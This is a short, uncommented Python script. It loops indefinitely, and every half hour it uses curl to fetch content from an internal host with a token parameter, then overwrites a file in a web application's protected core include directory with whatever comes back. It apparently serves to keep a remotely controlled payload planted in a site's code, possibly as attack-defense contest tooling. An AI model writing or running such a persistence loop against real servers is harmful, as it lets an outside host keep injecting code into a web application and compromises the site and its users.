import os
import time
while True:

    x = os.popen('curl http://10.0.1.2?token=UMKDDMUA').read()
    y = open('/var/www/html/protected/include/core/cpAPP.class.txt', 'w+')
    y.write(x)
    y.close()
    time.sleep(1800)
